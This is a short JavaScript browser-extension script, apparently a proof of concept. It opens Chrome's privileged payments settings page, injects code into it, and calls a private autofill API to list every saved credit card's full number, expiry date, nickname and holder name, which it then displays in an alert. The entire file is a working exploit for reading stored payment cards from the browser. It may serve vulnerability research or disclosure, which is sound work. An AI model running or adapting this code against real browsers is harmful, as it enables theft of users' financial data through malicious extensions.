/**
 * Open tab and wait for it to be ready
 * @param  {string}          url Tab URL
 * @return {Promise<number>}     Tab ID
 */
function openTab(url) {
    return new Promise(async resolve => {
        const tab = await chrome.tabs.create({url})
        const listener = (tabId, changeInfo) => {
            if (tab.id !== tabId || changeInfo.status !== 'complete') {
                // Ignore event
                return
            }
            chrome.tabs.onUpdated.removeListener(listener)
            resolve(tab.id)
        }
        chrome.tabs.onUpdated.addListener(listener)
    })
}

/**
 * Evaluate on tab
 * @param  {string}        tabId Tab ID
 * @param  {() => void}    fn    Function to execute
 * @return {Promise<void>}       Callback when finished
 */
async function evaluateOnTab(tabId, fn) {
    await chrome.scripting.executeScript({
        target: {tabId},
        world: chrome.scripting.ExecutionWorld.MAIN,
        func: fn
    })
}

(async () => {
    const tabId = await openTab('chrome://settings/payments')
    await evaluateOnTab(tabId, async () => {
        document.body.style.background = '#ffdde2' // Just for UI feedback
        const cards = await chrome.autofillPrivate.getCreditCardList()
        if (cards.length > 0) {
            const message = cards.map(card => {
                return `Nickname: ${card.nickname}\n` +
                    `PAN: ${card.cardNumber}\n` +
                    `Expiration: ${card.expirationMonth}/${card.expirationYear}\n` +
                    `Holder: ${card.name}\n`
            }).join('-----------------------------\n')
            alert(message)
        } else {
            alert('No cards found, add one and reload the extension')
        }
    })
})()
